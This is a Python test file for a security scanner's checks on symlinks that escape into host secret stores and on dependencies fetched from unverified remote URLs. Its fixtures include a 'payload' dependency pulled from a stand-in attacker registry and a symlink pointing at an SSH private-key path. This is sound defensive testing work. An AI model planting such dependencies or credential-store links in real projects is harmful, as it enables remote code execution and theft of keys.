"""C-228 / C-229 — B87 and B157 are promoted from advisory to scored.

Both checks already reached deterministic FAILs (B87: symlink realpath into a
sensitive host store; B157: unverifiable-provenance remote-code dependency,
mirroring the already-scored B103) that could never move the A-F grade. These
tests pin the promotion end-to-end: the catalog flag, and the fact that a real
FAIL produced by the real check function now lowers the computed score.
"""
from __future__ import annotations

import os
from pathlib import Path

import pytest

from clawseccheck.catalog import BY_ID, FAIL, PASS
from clawseccheck.checks import check_remote_code_dependency, check_symlink_escape
from clawseccheck.collector import Context
from clawseccheck.scoring import compute

posix_only = pytest.mark.skipif(os.name != "posix", reason="symlinks are POSIX-only")


def test_b87_catalog_promoted():
    assert BY_ID["B87"].scored is True
    assert BY_ID["B87"].block == "hardening"


def test_b157_catalog_promoted():
    assert BY_ID["B157"].scored is True
    assert BY_ID["B157"].block == "hardening"


def _skill_ctx(pkgjson: str) -> Context:
    c = Context(home=Path("/nonexistent"))
    c.config = {}
    c.bootstrap = {}
    c.installed_skills = {"skill": "# file: package.json\n" + pkgjson}
    return c


def test_b157_fail_now_lowers_the_score():
    fail_f = check_remote_code_dependency(
        _skill_ctx('{"dependencies":{"payload":"http://cdn.evil-registry.example/x.tgz"}}')
    )
    pass_f = check_remote_code_dependency(
        _skill_ctx('{"dependencies":{"dayjs":"1.11.10"}}')
    )
    assert fail_f.status == FAIL and fail_f.scored
    assert pass_f.status == PASS and pass_f.scored
    with_fail = compute([fail_f, pass_f])
    without_fail = compute([pass_f])
    assert with_fail.score < without_fail.score
    assert with_fail.failed_high >= 1


def test_b157_localhost_plaintext_registry_is_warn_not_fail():
    """C-135 sharp-edge close: a self-hosted verdaccio dep over plaintext http to a
    loopback / LAN host is an operator's own mirror, not an anonymous public source —
    WARN, never a scored FAIL."""
    for src in (
        "http://localhost:4873/pkg-1.0.0.tgz",
        "http://192.168.1.10:4873/pkg-1.0.0.tgz",
        "http://registry.internal/pkg-1.0.0.tgz",
    ):
        f = check_remote_code_dependency(_skill_ctx('{"dependencies":{"pkg":"%s"}}' % src))
        assert f.status != FAIL, f"{src} should be WARN, got {f.status}: {f.detail}"


@posix_only
def test_b87_fail_now_lowers_the_score(tmp_path):
    # The secret store lives OUTSIDE the audit home so the link genuinely ESCAPES into it.
    home = tmp_path / "openclaw"
    home.mkdir()
    store = tmp_path / "elsewhere" / ".ssh" / "id_ed25519"
    store.parent.mkdir(parents=True)
    store.write_text("secret-shaped", encoding="utf-8")

    skill = home / "skills" / "demo"
    skill.mkdir(parents=True)
    (skill / "SKILL.md").write_text("---\nname: demo\n---\nhello\n", encoding="utf-8")
    (skill / "creds").symlink_to(store)

    ctx = Context(home=home)
    ctx.config = {}
    ctx.bootstrap = {}
    ctx.skill_dirs = [skill]

    fail_f = check_symlink_escape(ctx)
    assert fail_f.status == FAIL and fail_f.scored, fail_f.detail

    pass_f = check_remote_code_dependency(
        _skill_ctx('{"dependencies":{"dayjs":"1.11.10"}}')
    )
    assert compute([fail_f, pass_f]).score < compute([pass_f]).score


@posix_only
def test_b87_in_tree_sensitive_symlink_is_warn_not_fail(tmp_path):
    """C-135 blocker regression: a monorepo `apps/api/.env -> ../../.env` link whose
    target stays INSIDE the workspace the agent already holds must NOT FAIL — the file is
    already readable without the link, so it is at most WARN. Promoting B87 to scored made
    this the difference between a spurious grade cap and a clean run."""
    home = tmp_path / "openclaw"
    ws = home / "workspace"
    (ws / "apps" / "api").mkdir(parents=True)
    (home / "SKILL.md").write_text("---\nname: monorepo\n---\n", encoding="utf-8")
    root_env = ws / ".env"
    root_env.write_text("SHARED=1\n", encoding="utf-8")
    (ws / "apps" / "api" / ".env").symlink_to(root_env)

    ctx = Context(home=home)
    ctx.config = {}
    ctx.bootstrap = {}
    ctx.skill_dirs = [ws]

    f = check_symlink_escape(ctx)
    assert f.status != FAIL, f"in-tree .env symlink must not FAIL: {f.detail}"
